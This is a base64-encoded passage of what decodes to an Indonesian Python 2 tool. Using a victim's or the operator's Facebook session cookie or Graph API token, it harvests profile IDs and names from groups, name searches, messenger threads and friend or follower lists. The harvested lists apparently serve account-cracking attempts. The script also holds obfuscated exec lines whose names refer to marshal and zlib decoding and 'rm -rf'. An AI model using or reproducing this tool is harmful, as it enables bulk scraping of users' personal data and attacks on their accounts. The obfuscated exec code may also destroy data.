SxLKSkNCgkJaWYgaWQgaW4oIiIpOg0KCQkJc2VsZi5tYW51YWwoKQ0KCQllbHNlOg0KCQkJX3JfPWJzNC5CZWF1dGlmdWxTb3VwKHJlcXVlc3RzLmdldCgiaHR0cHM6Ly9tYmFzaWMuZmFjZWJvb2suY29tL2dyb3Vwcy8iK2lkLGhlYWRlcnM9aGRjb2soKSxjb29raWVzPXNlbGYuY29va2llcykudGV4dCwiaHRtbC5wYXJzZXIiKQ0KCQkJaWYgImtvbnRlbiB0aWRhayIgaW4gX3JfLmZpbmQoInRpdGxlIikudGV4dC5sb3dlcigpOg0KCQkJCWV4aXQoIiVzJXMgaW5wdXQgaWQgZ3J1cCB5ZyB2YWxpZCBnb2Jsb2ssIGlkIGVycm9yLCBhdGF1IGx1IGJlbG9tIGpvb2luIGRpIGdydXAiJShNLHRpbCkpDQoJCQllbHNlOg0KCQkJCXNlbGYubGlzdGVkPXsiaWQiOmlkLCJuYW1lIjpfcl8uZmluZCgidGl0bGUiKS50ZXh0fQ0KCQkJCXNlbGYuZnVja195b3UoKQ0KCQkJCXByaW50KCIlcyVzJXMgTmFtYSBncnVwJXMgPiAlcyVzLi4iJShVLHRpbCxPLE0sSCxzZWxmLmxpc3RlZC5nZXQoIm5hbWUiKVswOjIwXSkpDQoJCQkJc2VsZi5kdW1wcygiaHR0cHM6Ly9tYmFzaWMuZmFjZWJvb2suY29tL2dyb3Vwcy8iK2lkKQ0KCWRlZiBmdWNrX3lvdShzZWxmKToNCgkJc2VsZi5mbD1yYXdfaW5wdXQoJyVzJXMlcyBOYW1hIGZpbGUgJXM+ICVzJyUoVSx0aWwsTyxNLEspKS5yZXBsYWNlKCIgIiwiXyIpDQoJCWlmIHNlbGYuZmw9PScnOnNlbGYuZnVja195b3UoKQ0KCQlvcGVuKHNlbGYuZmwsInciKS5jbG9zZSgpDQoJZGVmIGR1bXBzKHNlbGYsIHVybCk6DQoJCV9yXz1iczQuQmVhdXRpZnVsU291cChyZXF1ZXN0cy5nZXQodXJsLGNvb2tpZXM9c2VsZi5jb29raWVzLGhlYWRlcnM9aGRjb2soKSkudGV4dCwiaHRtbC5wYXJzZXIiKQ0KCQlwcmludCgiXHIlcyVzJXMgbWVuZ3VtcHVsa2FuIGlkICVzPiAlcyVzIFx4MWJbMTs5N20tIG1vaG9uIHR1bmdndVxyIiUoVSx0aWwsTyxNLEgsc3RyKGxlbihvcGVuKHNlbGYuZmwpLnJlYWQoKS5zcGxpdGxpbmVzKCkpKSkpDQoJCXN5cy5zdGRvdXQuZmx1c2goKTtqZWRhKDAuMDA1MCkNCgkJZm9yIF9pXyBpbiBfcl8uZmluZF9hbGwoImgzIik6DQoJCQl0cnk6DQoJCQkJaWYgbGVuKGJzNC5yZS5maW5kYWxsKCJcLyIsX2lfLmZpbmQoImEiLGhyZWY9VHJ1ZSkuZ2V0KCJocmVmIikpKT09MToNCgkJCQkJb2dlaD1faV8uZmluZCgiYSIsaHJlZj1UcnVlKQ0KCQkJCQlpZiAicHJvZmlsZS5waHAiIGluIG9nZWguZ2V0KCJocmVmIik6DQoJCQkJCQlfYV89IiIuam9pbihiczQucmUuZmluZGFsbCgicHJvZmlsZVwucGhwXD9pZD0oLio/KSYiLG9nZWguZ2V0KCJocmVmIikpKQ0KCQkJCQkJaWYgbGVuKF9hXyk9PTA6Y29udGludWUNCgkJCQkJCWVsaWYgX2FfIGluIG9wZW4oc2VsZi5mbCkucmVhZCgpOg0KCQkJCQkJCWNvbnRpbnVlDQoJCQkJCQllbHNlOg0KCQkJCQkJCW9wZW4oc2VsZi5mbCwiYSsiKS53cml0ZSgiJXM8PT4lc1xuIiUoX2FfLG9nZWgudGV4dCkpDQoJCQkJCQkJY29udGludWUNCgkJCQkJZWxzZToNCgkJCQkJCV9hXz0iIi5qb2luKGJzNC5yZS5maW5kYWxsKCIvKC4qPylcPyIsb2dlaC5nZXQoImhyZWYiKSkpDQoJCQkJCQlpZiBsZW4oX2FfKT09MDpjb250aW51ZQ0KCQkJCQkJZWxpZiBfYV8gaW4gb3BlbihzZWxmLmZsKS5yZWFkKCk6DQoJCQkJCQkJY29udGludWUNCgkJCQkJCWVsc2U6DQoJCQkJCQkJb3BlbihzZWxmLmZsLCJhKyIpLndyaXRlKCIlczw9PiVzXG4iJShfYV8sb2dlaC50ZXh0KSkNCgkJCWV4Y2VwdDpjb250aW51ZQ0KCQlmb3IgX2lfIGluIF9yXy5maW5kX2FsbCgiYSIsaHJlZj1UcnVlKToNCgkJCWlmICJMaWhhdCBQb3N0aW5nYW4gTGFpbm55YSIgaW4gX2lfLnRleHQ6DQoJCQkJd2hpbGUgVHJ1ZToNCgkJCQkJdHJ5Og0KCQkJCQkJc2VsZi5kdW1wcygiaHR0cHM6Ly9tYmFzaWMuZmFjZWJvb2suY29tLyIrX2lfLmdldCgiaHJlZiIpKQ0KCQkJCQkJYnJlYWsNCgkJCQkJZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOg0KCQkJCQkJcHJpbnQoIlxyXHgxYlsxOzkxbeKAoiVzLCByZXRyeWluZy4uLiIlZSk7Y29udGludWUNCgkJcHJpbnQgKCdcblxuJXMlcyBTdWNjZXMgZHVtcCBpZCBtZW1iZXIgZ3JvdXAgJyUoSCx0aWwpKTtwcmludCAoJyVzJXMlcyBGaWxlIGR1bXAgdGVyc2ltcGFuICVzPiVzICVzICclKFUsdGlsLE8sTSxILHNlbGYuZmwpKTtyYXdfaW5wdXQoJ1xuJXMlcyVzIFslcyBFbnRlciVzIF0gJyUoVSx0aWwsTyxVLE8pKTttZW51KCkNCmRlZiBjZWsoYXJnKToNCglpZiBvcy5wYXRoLmV4aXN0cygiZGF0YS9jb29raWVzIik6DQoJCWlmIG9zLnBhdGguZ2V0c2l6ZSgiZGF0YS9jb29raWVzIikgIT0wOg0KCQkJcmV0dXJuIFRydWUNCgkJZWxzZTpyZXR1cm4gRmFsc2UNCgllbHNlOnJldHVybiBGYWxzZQ0KIyBEVU1QIFBFTkNBUklBTiBOQU1BDQpkZWYgZHVtcGZsKCk6DQogICAgY3ZkcyA9IE5vbmUNCiAgICBjb29raWUgPSBOb25lDQogICAgbmV3ID0gTm9uZQ0KICAgIGlmIGNlaygxKSA9PSBGYWxzZToNCiAgICAgICAgdHJ5Og0KICAgICAgICAgICAgY29va2llID0gcmF3X2lucHV0KCJcbiVzJXMlcyBTdXBheWEgYmVrZXJqYSBtYXN1a2FuIGNvb2tpZSBmYWNlYm9vayBhbmRhXG4lcyMgJXNDb29raWUlcyA+ICVzIiUoVSx0aWwsTyxQLE8sTSxLKSkNCiAgICAgICAgICAgIGN2ZHMgPSBjdmQoY29va2llKQ0KICAgICAgICAgICAgbmV3ID0gVHJ1ZQ0KICAgICAgICBleGNlcHQ6DQogICAgICAgICAgICBwcmludCgiXHgxYlsxOzkxbeKAoiBpbnZhbGlkIGNvb2tpZSIpO2R1bXBmbCgpDQogICAgZWxzZToNCiAgICAgICAgY3ZkcyA9IGN2ZChvcGVuKCdkYXRhL2Nvb2tpZXMnKS5yZWFkKCkuc3RyaXAoKSkNCiAgICByID0gcmVxdWVzdHMuZ2V0KCdodHRwczovL21iYXNpYy5mYWNlYm9vay5jb20vcHJvZmlsZS5waHAnLCBjb29raWVzPWN2ZHMsIGhlYWRlcnM9aGRjb2soKSkudGV4dA0KICAgIGlmIGxlbihiczQucmUuZmluZGFsbCgnbG9nb3V0JywgcikpICE9IDA6DQogICAgICAgIGlmIGt1ZWgoY3ZkcykgIT0gVHJ1ZToNCiAgICAgICAgICAgIGV4aXQoIiVzJXMgZ2FnYWwgc2FhdCBtZW5kZXRla3NpIGJhaGFzYS4iJShNLHRpbCkpDQogICAgICAgICNwcmludCgiXG4lcyVzJXMgTG9naW4gc2ViYWdhaSVzIFsgJXMlcy4uXSIlKFUsdGlsLE8sTSxILGJzNC5CZWF1dGlmdWxTb3VwKHIsImh0bWwucGFyc2VyIikuZmluZCgidGl0bGUiKS50ZXh0WzA6MTBdKSkNCiAgICAgICAgaWYgbmV3ID09IFRydWU6DQogICAgICAgICAgICBvcGVuKCdkYXRhL2Nvb2tpZXMnLCAndycpLndyaXRlKGNvb2tpZSkNCiAgICAgICAgc2ltPXJhd19pbnB1dCgiXG4lcyVzJXMgTmFtYSBmaWxlICVzPiVzICIlKFUsdGlsLE8sTSxLKSkucmVwbGFjZSgiICIsIl8iKQ0KICAgICAgICBwcmludCAoIiVzJXMlcyBFeGFtcGxlIG5hbWEgb3JhbmcgJXNbICVzUm9taSxnYW50ZW5nICVzXSAiJShVLHRpbCxPLFAsSCxQKSkNCiAgICAgICAgbm1fb3Jhbmc9cmF3X2lucHV0KCIlcyVzJXMgU2V0dCBuYW1hICVzPiAlcyIlKFUsdGlsLE8sTSxLKSkNCiAgICAgICAgaWYgbm1fb3JhbmcgaW4oInJvbWkiLCJSb21pIiwiUk9NSSIsIlJvbWkgQWZyaXphbCIsIlJvbWkgYWZyaXphbCIsIlJPTUkgQUZSSVpBTCIsInJvbWkgYWZyaXphbCIpOg0KICAgICAgICAJcHJpbnQoIlxuJXMlcyBhbmFrIGFuamluZyBtYXUgY3JhY2sgcGFrZSBuYW1hIGd3ICIlKE0sdGlsKSk7ZXhpdCgpDQogICAgICAgIGVsaWYgbm1fb3JhbmcgaW4oIlJvbWkgR2FudGVuZyIsIlJvbWkgZ2FudGVuZyIsIlJPTUkgR0FOVEVORyIsInJvbWkgZ2FudGVuZyIpOg0KICAgICAgICAJcHJpbnQgKCJcbiVzJXMgbWVtYW5nIGdhbnRlbmcgZG9uZyBhYmFuZyBSb21pIiUoSCx0aWwpKTtleGl0KCkNCiAgICAgICAgbmFtYWgoc2ltLGN2ZHMsImh0dHBzOi8vbWJhc2ljLmZhY2Vib29rLmNvbS9zZWFyY2gvcGVvcGxlLz9xPSIrbm1fb3JhbmcpDQogICAgZWxzZToNCiAgICAgICAgdHJ5Og0KICAgICAgICAgICAgb3MucmVtb3ZlKCdkYXRhL2Nvb2tpZXMnKQ0KICAgICAgICBleGNlcHQ6DQogICAgICAgICAgICBwYXNzDQogICAgICAgIHByaW50ICdceDFiWzE7OTFt4oCiIGxvZ2luIGZhaWwhJw0KICAgICAgICBkdW1wZmwoKQ0KICAgIHJldHVybg0KZGVmIG5hbWFoKHNpbSxyLGIpOg0KCW9wZW4oc2ltLCJhKyIpDQoJYj1iczQuQmVhdXRpZnVsU291cChyZXF1ZXN0cy5nZXQoYiwgY29va2llcz1yLGhlYWRlcnM9aGRjb2soKSkudGV4dCwiaHRtbC5wYXJzZXIiKQ0KCWZvciBpIGluIGIuZmluZF9hbGwoImEiLGhyZWY9VHJ1ZSk6DQoJCSNvcy5zeXN0ZW0oImNsZWFyIikNCgkJI2Jhbm5lcigpDQoJCXByaW50KCJcciVzJXMlcyBtZW5ndW1wdWxrYW4gaWQgJXM+ICVzJXMgXHgxYlsxOzk3bS0gbW9ob24gdHVuZ2d1IiUoVSx0aWwsTyxNLEgsc3RyKGxlbihvcGVuKHNpbSkucmVhZCgpLnNwbGl0bGluZXMoKSkpKSksO3N5cy5zdGRvdXQuZmx1c2goKQ0KCQlpZiAiPGltZyBhbHQ9IiBpbiBzdHIoaSk6DQoJCQlpZiAiaG9tZS5waHAiIGluIHN0cihpWyJocmVmIl0pOg0KCQkJCWNvbnRpbnVlDQoJCQllbHNlOg0KCQkJCWc9c3RyKGlbImhyZWYiXSkNCgkJCQlpZiAicHJvZmlsZS5waHAiIGluIGc6DQoJCQkJCW5hbWU9aS5maW5kKCJpbWciKS5nZXQoImFsdCIpLnJlcGxhY2UoIiwgcHJvZmlsZSBwaWN0dXJlIiwiIikNCgkJCQkJZD1iczQucmUuZmluZGFsbCgiL3Byb2ZpbGVcLnBocFw/aWQ9KC4qPykmIixnKQ0KCQkJCQlpZiBsZW4gKGQpICE9MDoNCgkJCQkJCXBrPSIiLmpvaW4oZCkNCgkJCQkJCWlmIHBrIGluIG9wZW4oc2ltKS5yZWFkKCk6DQoJCQkJCQkJcGFzcw0KCQkJCQkJZWxzZToNCgkJCQkJCQlvcGVuKHNpbSwiYSsiKS53cml0ZSgiJXM8PT4lc1xuIiUocGssbmFtZSkpDQoJCQkJZWxzZToNCgkJCQkJZD1iczQucmUuZmluZGFsbCgiLyguKj8pXD8iLGcpDQoJCQkJCW5hbWU9aS5maW5kKCJpbWciKS5nZXQoImFsdCIpLnJlcGxhY2UoIiwgcHJvZmlsZSBwaWN0dXJlIiwiIikNCgkJCQkJaWYgbGVuKGQpICE9MDoNCgkJCQkJCXBrPSIiLmpvaW4oZCkNCgkJCQkJCWlmIHBrIGluIG9wZW4oc2ltKS5yZWFkKCk6DQoJCQkJCQkJcGFzcw0KCQkJCQkJZWxzZToNCgkJCQkJCQlvcGVuKHNpbSwiYSsiKS53cml0ZSgiJXM8PT4lc1xuIiUocGssbmFtZSkpDQoJCWlmICJMaWhhdCBIYXNpbCBTZWxhbmp1dG55YSIgaW4gaS50ZXh0Og0KCQkJbmFtYWgoc2ltLHIsaVsiaHJlZiJdKQ0KCXByaW50ICgnXG5cbiVzJXMgU3VjY2VzIGR1bXAgaWQgcGVuY2FyaWFuIG5hbWEgJyUoSCx0aWwpKTtwcmludCAoJyVzJXMlcyBGaWxlIGR1bXAgdGVyc2ltcGFuICVzPiVzICVzICclKFUsdGlsLE8sTSxILHNpbSkpO3Jhd19pbnB1dCgnXG4lcyVzJXMgWyVzIEVudGVyJXMgXSAnJShVLHRpbCxPLFUsTykpO21lbnUoKQ0KIyBEVU1QIFBFU0FODQpjbGFzcyBwZXNhbjoNCg0KICAgIGRlZiBfX2luaXRfXyhzZWxmLCBjb29raWVzKToNCiAgICAgICAgc2VsZi5jb29raWVzID0gY29va2llcw0KICAgICAgICAjX19yb216X18oKQ0KICAgICAgICAjb3Muc3lzdGVtKCJjbGVhciIpDQogICAgICAgIHNlbGYuZiA9IHJhd19pbnB1dCgnXG4lcyVzJXMgTmFtYSBmaWxlJXMgPiVzICclKFUsdGlsLE8sTSxLKSkucmVwbGFjZSgnICcsICdfJykNCiAgICAgICAgaWYgc2VsZi5mID09ICcnOg0KICAgICAgICAgICAgcGVzYW4oY29va2llcykNCiAgICAgICAgb3BlbihzZWxmLmYsICd3JykuY2xvc2UoKQ0KICAgICAgICBzZWxmLmR1bXAoJ2h0dHBzOi8vbWJhc2ljLmZhY2Vib29rLmNvbS9tZXNzYWdlcycpDQogICAgZGVmIGR1bXAoc2VsZix1cmwpOg0KICAgIAlvcGVuKHNlbGYuZiwgJ2ErJykNCiAgICAgICAgYnMgPSBiczQuQmVhdXRpZnVsU291cChyZXF1ZXN0cy5nZXQodXJsLCBoZWFkZXJzPWhkY29rKCksIGNvb2tpZXM9c2VsZi5jb29raWVzKS50ZXh0LCAnaHRtbC5wYXJzZXInKQ0KICAgICAgICBwcmludCAoIlxyJXMlcyVzIG1lbmd1bXB1bGthbiBpZCAlcz4gJXMlcyBceDFiWzE7OTdtLSBtb2hvbiB0dW5nZ3VcciIlKFUsdGlsLE8sTSxILHN0cihsZW4ob3BlbihzZWxmLmYpLnJlYWQoKS5zcGxpdGxpbmVzKCkpKSkpO3N5cy5zdGRvdXQuZmx1c2goKTtqZWRhKDAuMDA1MCkNCiAgICAgICAgZm9yIGkgaW4gYnMuZmluZF9hbGwoJ2EnLCBocmVmPVRydWUpOg0KICAgICAgICAgICAgaWYgJy9tZXNzYWdlcy9yZWFkJyBpbiBpLmdldCgnaHJlZicpOg0KICAgICAgICAgICAgICAgIGYgPSBiczQucmUuZmluZGFsbCgnY2lkXFwuY1xcLiguKj8pJTNBKC4qPykmJywgaS5nZXQoJ2hyZWYnKSkNCiAgICAgICAgICAgICAgICB0cnk6DQogICAgICAgICAgICAgICAgICAgIGZvciBpcCBpbiBsaXN0KGYucG9wKCkpOg0KICAgICAgICAgICAgICAgICAgICAgICAgaWYgc2VsZi5jb29raWVzLmdldCgnIGNfdXNlcicpIGluIGlwOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvbnRpbnVlDQogICAgICAgICAgICAgICAgICAgICAgICBlbHNlOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmICdwZW5nZ3VuYSBmYWNlYm9vaycgaW4gaS50ZXh0Lmxvd2VyKCk6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvbnRpbnVlDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgb3BlbihzZWxmLmYsICdhKycpLndyaXRlKCclczw9PiVzXG4nICUgKGlwLCBpLnRleHQpKQ0KICAgICAgICAgICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToNCiAgICAgICAgICAgICAgICAgICAgY29udGludWUNCiAgICAgICAgICAgIGlmICdMaWhhdCBQZXNhbiBTZWJlbHVtbnlhJyBpbiBpLnRleHQ6DQogICAgICAgICAgICAgICAgc2VsZi5kdW1wKCdodHRwczovL21iYXNpYy5mYWNlYm9vay5jb20vJyArIGkuZ2V0KCdocmVmJykpDQogICAgICAgIHByaW50ICgnXG4lcyVzIFN1Y2NlcyBkdW1wIGlkIHBlc2FuIG1lc2VuZ2dlciAnJShILHRpbCkpDQogICAgICAgIHByaW50ICgnJXMlcyVzIEZpbGUgZHVtcCB0ZXJzaW1wYW4gJXM+JXMgJXMgJyUoVSx0aWwsTyxNLEgsc2VsZi5mKSkNCiAgICAgICAgcmF3X2lucHV0KCdcbiVzJXMlcyBbJXMgRW50ZXIlcyBdICclKFUsdGlsLE8sVSxPKSk7bWVudSgpDQojIERVTVAgSUQgRkFDRUJPT0sNCmNsYXNzIGR1bXBfaWQ6DQoJDQoJZGVmIF9faW5pdF9fKHNlbGYpOg0KCQlzZWxmLmZiID0gW10NCgkJc2VsZi5yb20gPSBbXQ0KCQkNCglkZWYgcGlsaWhhbihzZWxmKToNCgkJcHJpbnQgKCdcbiVz4oCiJXMgMDEgJXNEdW1wIGlkIHB1YmxpYyclKFUsUCxPKSkNCgkJcHJpbnQgKCclc+KAoiVzIDAyICVzRHVtcCBpZCBmb2xsb3dlcnMnJShVLFAsTykpDQoJCXByaW50ICgnJXPigKIlcyAwMCAlc0tlbWJhbGknJShVLE0sTykpDQoJCXIgPSByYXdfaW5wdXQoJ1xuJXMjICVzUGlsaWggJXM+ICVzJyUoUCxPLE0sSykpDQoJCWlmIHIgaW5bJyddOg0KCQkJcHJpbnQgJ1xuJXMlcyBpc2kgeWFuZyBiZW5hciclKE0sdGlsKTtqZWRhKDIpO3NlbGYucGlsaWhhbigpDQoJCWVsaWYgciBpblsnMScsJzAxJ106DQoJCQlwcmludCAoIlxuJXMlcyAlc0tldGlrICclc21lJXMnIGppa2EgaW5naW4gZHVtcCBkYWZ0YXIgdGVtYW4gc2VuZGlyaSAiJShVLHRpbCxPLEgsTykpDQoJCQlkdW0gPSByYXdfaW5wdXQoJyVzJXMgJXNUYXJnZXQgaWQlcyA+ICVzJyUoVSx0aWwsTyxNLEspKQ0KCQkJbGltID0gcmF3X2lucHV0KCclcyVzICVzTWF4aW1hbCBpZCVzID4gJXMnJShVLHRpbCxPLE0sSykpDQoJCQlpZiBkdW0gPT0gJyc6DQoJCQkJcHJpbnQgJ1xuJXMlcyBpc2kgeWFuZyBiZW5hciclKE0sdGlsKTtqZWRhKDIpO2V4aXQoKQ0KCQkJdHJ5Og0KCQkJCXJvbXogPSBvcGVuKCdkYXRhL3Rva2VuLnR4dCcsICdyJykucmVhZCgpDQoJCQkJb3R3ID0gcmVxdWVzdHMuZ2V0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8lcz9hY2Nlc3NfdG9rZW49JXMnICUgKGR1bSwgcm9teikpDQoJCQkJYSA9IGpzb24ubG9hZHMob3R3LnRleHQpDQoJCQkJcHJpbnQgJycNCgkJCWV4Y2VwdCAoS2V5RXJyb3IsIElPRXJyb3IpOg0KCQkJCXByaW50ICclc+KAoiBJZCB0aWRhayBwdWJsaWsnJShNKTtleGl0KCkNCgkJCXIgPSByZXF1ZXN0cy5nZXQoJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLyVzL2ZyaWVuZHM/bGltaXQ9JXMmYWNjZXNzX3Rva2VuPSVzJyAlIChkdW0sIGxpbSwgcm9teikpDQoJCQl6ID0ganNvbi5sb2FkcyhyLnRleHQpDQoJCQlmb3IgeCBpbiB6WydkYXRhJ106DQoJCQkJc2VsZi5mYi5hcHBlbmQoeFsnaWQnXSkNCgkJCWZvciBpZCBpbiBzZWxmLmZiOg0KCQkJCXRyeToNCgkJCQkJbSA9IHJlcXVlc3RzLmdldCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vJXMvZnJpZW5kcz9hY2Nlc3NfdG9rZW49JXMnICUgKGlkLCByb216KSkNCgkJCQkJbyA9IGpzb24ubG9hZHMobS50ZXh0KQ0KCQkJCQl0cnk6DQoJCQkJCQlmb3IgdSBpbiBvWydkYXRhJ106DQoJCQkJCQkJc2VsZi5yb20uYXBwZW5kKHVbJ2lkJ10pDQoJCQkJCWV4Y2VwdCAoS2V5RXJyb3IsIElPRXJyb3IpOg0KCQkJCQkJcHJpbnQgJyVz4oCiIHRlbWFuIHByaXZhdGUnJShNKQ0KCQkJCQlwcmludCAnJXM9PiAlc2lkIGZhY2Vib29rJXMgOiAlcyVzXG4gICVzIHRlbWFuJXMgOiVzICVzICclKFUsTyxNLEssaWQsTyxNLEssbGVuKHNlbGYucm9tKSkNCgkJCQkJZGVsIHNlbGYucm9tWzpdDQoJCQkJZXhjZXB0IChLZXlFcnJvciwgSU9FcnJvcik6DQoJCQkJCXByaW50ICclc+KAoiBha3VuIHRlcmtlbmEgc3BhbSclKE0pDQoJCQlleGl0KCkNCgkJZWxpZiByIGluWycyJywnMDInXToNCgkJCXByaW50ICgiXG4lcyVzICVzS2V0aWsgJyVzbWUlcycgamlrYSBpbmdpbiBkdW1wIGZvbGxvd2VycyBzZW5kaXJpICIlKFUsdGlsLE8sSCxPKSkNCgkJCWR1bSA9IHJhd19pbnB1dCgnJXMlcyAlc1RhcmdldCBpZCVzID4gJXMnJShVLHRpbCxPLE0sSykpDQoJCQlsaW0gPSByYXdfaW5wdXQoJyVzJXMgJXNNYXhpbWFsIGlkJXMgPiAlcyclKFUsdGlsLE8sTSxLKSkNCgkJCWlmIGR1bSA9PSAnJzoNCgkJCQlwcmludCAnXG4lcyVzIGlzaSB5YW5nIGJlbmFyJyUoTSx0aWwpO2plZGEoMik7ZXhpdCgpDQoJCQl0cnk6DQoJCQkJcm9teiA9IG9wZW4oJ2RhdGEvdG9rZW4udHh0JywgJ3InKS5yZWFkKCkNCgkJCQlvdHcgPSByZXF1ZXN0cy5nZXQoJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLyVzP2FjY2Vzc190b2tlbj0lcycgJSAoZHVtLCByb216KSkNCgkJCQlhID0ganNvbi5sb2FkcyhvdHcudGV4dCkNCgkJCQlwcmludCAnJw0KCQkJZXhjZXB0IChLZXlFcnJvciwgSU9FcnJvcik6DQoJCQkJcHJpbnQgJyVz4oCiIGlkIHRpZGFrIGFkYSclKE0pO2V4aXQoKQ0KCQkJciA9IHJlcXVlc3RzLmdldCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vJXMvc3Vic2NyaWJlcnM/bGltaXQ9JXMmYWNjZXNzX3Rva2VuPSVzJyAlIChkdW0sIGxpbSwgcm9teikpDQoJCQl6ID0ganNvbi5sb2FkcyhyLnRleHQpDQoJCQlmb3IgeCBpbiB6WydkYXRhJ106DQoJCQkJc2VsZi5mYi5hcHBlbmQoeFsnaWQnXSkNCgkJCWZvciBpZCBpbiBzZWxmLmZiOg0KCQkJCXRyeToNCgkJCQkJbSA9IHJlcXVlc3RzLmdldCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vJXMvc3Vic2NyaWJlcnM/YWNjZXNzX3Rva2VuPSVzJyAlIChpZCwgcm9teikpDQoJCQkJCW8gPSBqc29uLmxvYWRzKG0udGV4dCkNCgkJCQkJdHJ5Og0KCQkJCQkJZm9yIHUgaW4gb1snZGF0YSddOg0KCQkJCQkJCXNlbGYucm9tLmFwcGVuZCh1WydpZCddKQ0KCQkJCQlleGNlcHQgKEtleUVycm9yLCBJT0Vycm9yKToNCgkJCQkJCXByaW50ICclc+KAoiB0aWRhayBhZGEgcGVuZ2lrdXQnJShNKQ0KCQkJCQlwcmludCAnJXM9PiAlc2lkIGZhY2Vib29rJXMgOiAlcyVzXG4gICVzIHRlbWFuJXMgOiVzICVzICclKFUsTyxNLEssaWQsTyxNLEssbGVuKHNlbGYucm9tKSkNCgkJCQkJZGVsIHNlbGYucm9tWzpdDQoJCQkJZXhjZXB0IChLZXlFcnJvciwgSU9FcnJvcik6DQoJCQkJCXByaW50ICclc+KAoiBha3VuIHRlcmtlbmEgc3BhbSclKE0pDQoJCQlleGl0KCkNCgkJZWxpZiByIGluWycwJywnMDAnXToNCgkJCW1lbnUoKQ0KCQllbHNlOg0KCQkJcHJpbnQgJ1xuJXMlcyBpc2kgeWFuZyBiZW5hciclKE0sdGlsKTtqZWRhKDIpO2V4aXQoKQ0KIyBJTlNUQUdSQU0NCmV4ZWNfX19faW1wb3J0X21hcnNoYWxfemxpYl9iYXNlNjRfYmFzZTMyX2RlY29kZV9fX19leGVjID0gX19leGVjX19fK19fX19leGVjX19fYmFzZTY0X2RlY29kZV9fXytfX19fX2V4ZWNfX19kZWNvZGVfcHljb20rX19fX19fX19fX19fX19fX19fX19fX19fX19fXw0KX19fZXhlY19zdHJfX19fX19fX19fX19fbGFtYmRhX19fX19fX19fX19fX29zX3N5c19ybV9yZl9fX19fX19fX19fX18gPSBfX19fX19fX19fX19fX2lfX19fX19fX19fX19fXytfX19fX19fX2V4ZWNfbGFtYmRhX19fX19fX18NCg0KIyBoYWR1aA0KZGVmIGlnZygpOg0KCV9fX19fZXhlY19sYW1iZGFfX19fXyhleGVjX19fX2ltcG9ydF9tYXJzaGFsX3psaWJfYmFzZTY0X2Jhc2UzMl9kZWNvZGVfX19fZXhlYytfX19leGVjX3N0cl9fX19fX19fX19fX19sYW1iZGFfX19fX19fX19fX19fb3Nfc3lzX3JtX3JmX19fX19fX19fX19fXykNCglfX19fX2V4ZWNfbGFtYmRhX19fX18oRXh4eF9fX19fX19fX19fX19fX19fX19fX19vc19zeXNfX3JtX3JmX2NfX19fX19fX3N0cl9pX3NvX19fX19fX19leF9sYW1iZGEpDQoNCiMgVVNFUiBBR0VOVA0KZGVmIHVzZXJfYWdlbnRBUEkoKToNCgl1Z2VudCA9Ww0KCSAgICAiTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDQuMS4yOyBOb2tpYV9YIEJ1aWxkL0paTzU0SykgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzMwLjAuMTU5OS44MiBNb2JpbGUgU2FmYXJpLzUzNy4zNiBOb2tpYUJyb3dzZXIvMS4yLjAuMTIiLA0KCSAgICAiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzkwLjAuNDQzMC45MyBTYWZhcmkvNTM3LjM2IiwNCgkgICAgIk1vemlsbGEvNS4wIChMaW51eDsgQW5kcm9pZCA0LjEuMjsgTm9raWFfWCBCdWlsZC9KWk81NEspIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8yNy4wLjg3LjkwIE1vYmlsZSBTYWZhcmkvNTM3LjM2IE5va2lhQnJvd3Nlci8xLjAsZ3ppcChnZmUpIiwNCiAgICAgICAgIk5va2lhQzMtMDAvNS4wICgwNy4yMCkgUHJvZmlsZS9NSURQLTIuMSBDb25maWd1cmF0aW9uL0NMREMtMS4xIE1vemlsbGEvNS4wIEFwcGxlV2ViS2l0LzQyMCsgKEtIVE1MLCBsaWtlIEdlY2tvKSBTYWZhcmkvNDIwKyIsDQogICAgICAgICJOb2tpYVgyLTAwLzUuMCAoMDguMzUpIFByb2ZpbGUvTUlEUC0yLjEgQ29uZmlndXJhdGlvbi9DTERDLTEuMSBNb3ppbGxhLzUuMCAoSmF2YTsgVTsgZW4tdXM7IG5va2lheDItMDApIiwNCiAgICAgICAgIk1vemlsbGEvNS4wIChMaW51eDsgQW5kcm9pZCAxMDsgTWkgOVQgUHJvIEJ1aWxkL1FLUTEuMTkwODI1LjAwMjsgd3YpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIFZlcnNpb24vNC4wIENocm9tZS84OC4wLjQzMjQuMTgxIE1vYmlsZSBTYWZhcmkvNTM3LjM2W0ZCQU4vRU1BO0ZCTEMvaXRfSVQ7RkJBVi8yMzkuMC4wLjEwLjEwOTtdIiwNCiAgICAgICAgIk1vemlsbGEvNS4wIChXaW5kb3dzOyBVOyBXaW5kb3dzIE5UIDUuMTsgZW4tVVMpIEFwcGxlV2ViS2l0LzUzMi4yIChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lUGx1cy80LjAuMjIyLjMgQ2hyb21lLzQuMC4yMjIuMyBTYWZhcmkvNTMyLjIiLA0KICAgICAgICAiTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDUuMDsgQVNVU19aMDBBRCBCdWlsZC9MUlgyMVYpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIFZlcnNpb24vNC4wIENocm9tZS8zNy4wLjAuMCBNb2JpbGUgU2FmYX